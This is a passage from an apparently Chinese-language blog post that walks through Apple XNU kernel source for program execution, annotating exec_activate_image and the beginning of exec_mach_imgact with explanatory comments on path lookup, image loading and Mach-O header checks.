get_bsdthread_info(current_thread());</span><br><span class="line">	if (uthread-&gt;uu_flag &amp; UT_VFORK) &#123;</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_VFORK_EXEC;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	//MAC模块相应的处理，与进程的权限相关</span><br><span class="line">  	//MAC:https://www.freebsd.org/doc/handbook/mac.html</span><br><span class="line">#if CONFIG_MACF</span><br><span class="line">	if (uap-&gt;mac_p != USER_ADDR_NULL) &#123;</span><br><span class="line">		error = mac_execve_enter(uap-&gt;mac_p, imgp);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">			goto exit_with_error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">#endif</span><br><span class="line">	</span><br><span class="line">  	//执行image</span><br><span class="line">	error = exec_activate_image(imgp);</span><br><span class="line"></span><br><span class="line">  	//释放资源与出错处理</span><br><span class="line">	kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Image not claimed by any activator? */</span></span><br><span class="line">	if (error == -1)</span><br><span class="line">		error = ENOEXEC;</span><br><span class="line">	<span class="comment">/*...*/</span>	</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
<p>主要就是进行了一些数据结构的初始化已经权限的判断，资源的获取与释放，主要逻辑在<code>exec_activate_image</code>中。</p>
<h2 id="1-2_exec_activate_image">1.2 exec_activate_image</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * exec_activate_image</span><br><span class="line"> *</span><br><span class="line"> * Description:	Iterate through the available image activators, and activate</span><br><span class="line"> *		the image associated with the imgp structure.  We start with</span><br><span class="line"> *		the</span><br><span class="line"> *</span><br><span class="line"> * Parameters:	struct image_params *	Image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	0			Success</span><br><span class="line"> *		EBADEXEC		The executable is corrupt/unknown</span><br><span class="line"> *	execargs_alloc:EINVAL		Invalid argument</span><br><span class="line"> *	execargs_alloc:EACCES		Permission denied</span><br><span class="line"> *	execargs_alloc:EINTR		Interrupted function</span><br><span class="line"> *	execargs_alloc:ENOMEM		Not enough space</span><br><span class="line"> *	exec_save_path:EFAULT		Bad address</span><br><span class="line"> *	exec_save_path:ENAMETOOLONG	Filename too long</span><br><span class="line"> *	exec_check_permissions:EACCES	Permission denied</span><br><span class="line"> *	exec_check_permissions:ENOEXEC	Executable file format error</span><br><span class="line"> *	exec_check_permissions:ETXTBSY	Text file busy [misuse of error code]</span><br><span class="line"> *	exec_check_permissions:???</span><br><span class="line"> *	namei:???</span><br><span class="line"> *	vn_rdwr:???			[anything vn_rdwr can return]</span><br><span class="line"> *	&lt;ex_imgact&gt;:???			[anything an imgact can return]</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">exec_activate_image</span><span class="params">(<span class="keyword">struct</span> image_params *imgp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> nameidata *ndp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *excpath;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> resid;</span><br><span class="line">	<span class="keyword">int</span> once = <span class="number">1</span>;	<span class="comment">/* save SGUID-ness for interpreted files */</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> itercount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">proc_t</span> p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">	error = execargs_alloc(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	</span><br><span class="line">	error = exec_save_path(imgp, imgp-&gt;ip_user_fname, imgp-&gt;ip_seg, &amp;excpath);</span><br><span class="line">	<span class="keyword">if</span> (error) &#123;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Use excpath, which contains the copyin-ed exec path */</span></span><br><span class="line">	DTRACE_PROC1(exec, <span class="keyword">uintptr_t</span>, excpath);</span><br><span class="line"></span><br><span class="line">	MALLOC(ndp, <span class="keyword">struct</span> nameidata *, <span class="keyword">sizeof</span>(*ndp), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	<span class="keyword">if</span> (ndp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error = ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	NDINIT(ndp, LOOKUP, OP_LOOKUP, FOLLOW | LOCKLEAF | AUDITVNPATH1,</span><br><span class="line">		   UIO_SYSSPACE, CAST_USER_ADDR_T(excpath), imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line">	error = namei(ndp); <span class="comment">//<span class="doctag">todo:</span>	详细流程先不看，研究下来感觉是路径的搜索</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	imgp-&gt;ip_ndp = ndp;	<span class="comment">/* successful namei(); call nameidone() later */</span></span><br><span class="line">	imgp-&gt;ip_vp = ndp-&gt;ni_vp;	<span class="comment">/* if set, need to vnode_put() at some point */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Before we start the transition from binary A to binary B, make</span><br><span class="line">	 * sure another thread hasn't started exiting the process.  We grab</span><br><span class="line">	 * the proc lock to check p_lflag initially, and the transition</span><br><span class="line">	 * mechanism ensures that the value doesn't change after we release</span><br><span class="line">	 * the lock.</span><br><span class="line">	 */</span></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;p_lflag &amp; P_LEXIT) &#123;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line">	error = proc_transstart(p, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line"></span><br><span class="line">	error = exec_check_permissions(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy; avoid invocation of an interpreter overwriting the original */</span></span><br><span class="line">	<span class="keyword">if</span> (once) &#123;</span><br><span class="line">		once = <span class="number">0</span>;</span><br><span class="line">		*imgp-&gt;ip_origvattr = *imgp-&gt;ip_vattr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//读取数据到内存中</span></span><br><span class="line">	error = vn_rdwr(UIO_READ, imgp-&gt;ip_vp, imgp-&gt;ip_vdata, PAGE_SIZE, <span class="number">0</span>,</span><br><span class="line">			UIO_SYSSPACE, IO_NODELOCKED,</span><br><span class="line">			vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">			&amp;resid, vfs_context_proc(imgp-&gt;ip_vfs_context));</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (resid) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(imgp-&gt;ip_vdata + (PAGE_SIZE - resid), <span class="number">0x0</span>, resid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//到这里之前的代码主要做了两件事情</span></span><br><span class="line">  	<span class="comment">//1.根据路径查找文件</span></span><br><span class="line">  	<span class="comment">//2.将文件拷贝到内存中</span></span><br><span class="line">encapsulated_binary:</span><br><span class="line">	<span class="comment">/* Limit the number of iterations we will attempt on each binary */</span></span><br><span class="line">	<span class="keyword">if</span> (++itercount &gt; EAI_ITERLIMIT) &#123;</span><br><span class="line">		error = EBADEXEC;</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line">	&#125;</span><br><span class="line">	error = -<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; error == -<span class="number">1</span> &amp;&amp; execsw[i].ex_imgact != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">		<span class="comment">//这里对macho文件进行了解析</span></span><br><span class="line">		error = (*execsw[i].ex_imgact)(imgp);	<span class="comment">//<span class="doctag">todo:</span>调用了一个指针函数，exec_mach_imgact</span></span><br><span class="line">      	<span class="comment">//总共有三种函数</span></span><br><span class="line">      	<span class="comment">/*</span><br><span class="line">        struct execsw &#123;</span><br><span class="line">		int (*ex_imgact)(struct image_params *);</span><br><span class="line">		const char *ex_name;</span><br><span class="line">		&#125; execsw[] = &#123;</span><br><span class="line">		&#123; exec_mach_imgact,		"Mach-o Binary" &#125;,</span><br><span class="line">		&#123; exec_fat_imgact,		"Fat Binary" &#125;,</span><br><span class="line">		&#123; exec_shell_imgact,		"Interpreter Script" &#125;,</span><br><span class="line">		&#123; NULL, NULL&#125;</span><br><span class="line">&#125;;</span><br><span class="line">*/</span></span><br><span class="line">      	<span class="comment">//分别是osx支持的三种不同的可执行文件</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (error) &#123;</span><br><span class="line">            <span class="comment">/*出错处理*/</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Call out to allow 3rd party notification of exec. </span><br><span class="line">	 * Ignore result of kauth_authorize_fileop call.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> &amp;&amp; kauth_authorize_fileop_has_listeners()) &#123;</span><br><span class="line">		kauth_authorize_fileop(vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">					KAUTH_FILEOP_EXEC,</span><br><span class="line">					(<span class="keyword">uintptr_t</span>)ndp-&gt;ni_vp, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	proc_transend(p, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bad_notrans:</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_strings)</span><br><span class="line">		execargs_free(imgp);</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_ndp)</span><br><span class="line">		nameidone(imgp-&gt;ip_ndp);</span><br><span class="line">	<span class="keyword">if</span> (ndp)</span><br><span class="line">		FREE(ndp, M_TEMP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数主要做的事情就是寻找并拷贝<strong>可执行文件</strong>到内存中，并且根据可执行文件的类型调用不同的解析函数。osx总共支持三种可执行文件。他们各自有对应的处理函数。</p>
<ul>
<li><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o</a>：exec_mach_imgact</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E4%BA%8C%E8%BF%9B%E5%88%B6" target="_blank" rel="external">Fat Binary</a>：exec_fat_imgact</li>
<li>Interpreter Script：exec_shell_imgact</li>
</ul>
<h2 id="1-3_exec_mach_imgact">1.3 exec_mach_imgact</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * exec_mach_imgact</span><br><span class="line"> *</span><br><span class="line"> * Image activator for mach-o 1.0 binaries.</span><br><span class="line"> *</span><br><span class="line"> * Parameters;	struct image_params *	image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	-1			not a fat binary (keep looking)</span><br><span class="line"> *		-2			Success: encapsulated binary: reread</span><br><span class="line"> *		&gt;0			Failure: error number</span><br><span class="line"> *		EBADARCH		Mach-o binary, but with an unrecognized</span><br><span class="line"> *					architecture</span><br><span class="line"> *		ENOMEM			No memory for child process after -</span><br><span class="line"> *					can only happen after vfork()</span><br><span class="line"> *</span><br><span class="line"> * Important:	This image activator is NOT byte order neutral.</span><br><span class="line"> *</span><br><span class="line"> * Note:	A return value other than -1 indicates subsequent image</span><br><span class="line"> *		activators should not be given the opportunity to attempt</span><br><span class="line"> *		to activate the image.</span><br><span class="line"> *</span><br><span class="line"> * TODO:	More gracefully handle failures after vfork</span><br><span class="line"> */</span><br><span class="line">static int</span><br><span class="line">exec_mach_imgact(struct image_params *imgp)</span><br><span class="line">&#123;</span><br><span class="line">	struct mach_header *mach_header = (struct mach_header *)imgp-&gt;ip_vdata;</span><br><span class="line">	proc_t			p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line">	int			error = 0;</span><br><span class="line">	task_t			task;</span><br><span class="line">	task_t			new_task = NULL; /* protected by vfexec */</span><br><span class="line">	thread_t		thread;</span><br><span class="line">	struct uthread		*uthread;</span><br><span class="line">	vm_map_t old_map = VM_MAP_NULL;</span><br><span class="line">	vm_map_t map;</span><br><span class="line">	load_return_t		lret;</span><br><span class="line">	load_result_t		load_result;</span><br><span class="line">	struct _posix_spawnattr *psa = NULL;</span><br><span class="line">	int			spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span class="line">	int			vfexec = (imgp-&gt;ip_flags &amp; IMGPF_VFORK_EXEC);</span><br><span class="line">	int			p_name_len;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * make sure it's a Mach-O 1.0 or Mach-O 2.0 binary; the difference</span><br><span class="line">	 * is a reserved field on the end, so for the most part, we can</span><br><span class="line">	 * treat them as if they were identical. Reverse-endian Mach-O</span><br><span class="line">	 * binaries are recognized but not compatible.</span><br><span class="line"> 	 */</span><br><span class="line">    // 检测header里面的magic，是否符合macho文件的特征</span><br><span class="line">  	// NXSwapInt:PowerPC等平台中的二进制文件</span><br><span class="line">  	//MH_CIGAM    = 0xCEFAEDFE</span><br><span class="line">    //MH_CIGAM_64 = 0xCFFAEDFE</span><br><span class="line">	if ((mach_header-&gt;magic == MH_CIGAM) ||</span><br><span class="line">	    (mach_header-&gt;magic == MH_CIGAM_64)) &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	// 检测header里面的magic，是否符合macho文件的特征</span><br><span class="line">    // #define	MH_MAGIC	0xfeedface</span><br><span class="line">  	// #define MH_MAGIC_64 0xfeedfacf </span><br><span class="line">    // 通用的macho二进制文件，一般遇到都是这种</span><br><span class="line">	if ((mach_header-&gt;magic != MH_MAGIC) 